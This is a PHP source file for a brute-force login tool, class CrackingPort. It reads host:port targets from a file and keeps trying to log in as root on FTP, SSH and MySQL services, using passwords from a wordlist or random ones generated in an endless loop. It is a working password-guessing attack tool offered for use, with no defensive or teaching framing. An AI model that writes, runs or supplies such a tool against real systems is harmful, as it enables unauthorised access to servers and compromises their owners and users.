<?php
/**
 * Brute force
 *
 */

namespace Cracking;

use SplFileObject;
use Exception;
use Cracking\Ftp;
use Cracking\Ssh;
use Cracking\Mysql;


class CrackingPort
{
    private $hosts_port_file = HOSTS_PORT_FILE;
    private $use_random_password = USE_RANDOM_PASSWORD;
    private $user_password_file = USER_PASSWORD_FILE;
    private $delimiter = ':';
    private $host;
    private $port;
    private $user = 'root';
    private $password;

    public function __construct()
    {
        if (!is_file($this->hosts_port_file)) {
            echo __FILE__;
            exit('no file:' . $this->hosts_port_file . PHP_EOL);
        }

        if (!$this->use_random_password) {
            if (!is_file($this->user_password_file)) {
                exit('no file:' . $this->user_password_file . PHP_EOL);
            }
        }
    }


    public function execute()
    {
        if ($this->use_random_password) {
            try {
                while (true) {
                    $length = mt_rand(8, 16);
                    $this->generate_password($length);

                    $this->do_crack();

                    $this->memory_use();

                }


            } catch (Exception $e) {
                echo $e->getMessage();
            }


        } else {
            $fp_password = new SplFileObject($this->user_password_file, 'r');

            if ($fp_password) {
                try {
                    while ($fp_password->valid()) {
                        $this->password = trim($fp_password->fgets());

                        $this->do_crack();

                        $this->memory_use();

                    }


                } catch (Exception $e) {
                    echo $e->getMessage();
                }

                unset($fp_password);

                $this->memory_use();
            }
        }

    }

    public function do_crack()
    {
        if ($this->password && !empty($this->password)) {
            $fp = new SplFileObject($this->hosts_port_file, 'r');
            if ($fp) {
                while ($fp->valid()) {
                    $host_port = trim($fp->fgets());

                    if ($host_port && !empty($host_port)) {
                        $arr = explode($this->delimiter, trim($host_port));
                        $this->host = isset($arr[0]) ? $arr[0] : '';
                        $this->port = isset($arr[1]) ? $arr[1] : '';

                        $this->auth();
                    }
                    echo PHP_EOL;

                }

            }
            unset($fp);

        }
        echo PHP_EOL;
    }

    public function memory_use()
    {
        $size = memory_get_usage(true);
        $unit = ['b', 'kb', 'mb', 'gb', 'tb', 'pb'];
        $i = (int)floor(log($size, 1024));
        $memory_use = round($size / pow(1024, $i), 2) . ' ' . $unit[$i];
        echo date('Y-m-d H:i:s') . ' ' . $memory_use . PHP_EOL;
    }

    private function auth()
    {
        $class = 'Cracking\\' . PORT_CLASS[$this->port];
        $ssh = new $class($this->host, $this->port);
        $ssh->auth($this->user, $this->password);
    }

    function generate_password($length = 8)
    {
        // 密码字符集，可任意添加你需要的字符
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_ []{}<>~`+=,.;:/?|';
        $password = '';
        for ($i = 0; $i < $length; $i++) {

            // $password .= substr($chars, mt_rand(0, strlen($chars) – 1), 1);
            $password .= $chars[mt_rand(0, strlen($chars) - 1)];
        }

        $this->password = $password;
    }


    public function __destruct()
    {
        unset($this->host, $this->port, $this->user, $this->password);
    }

}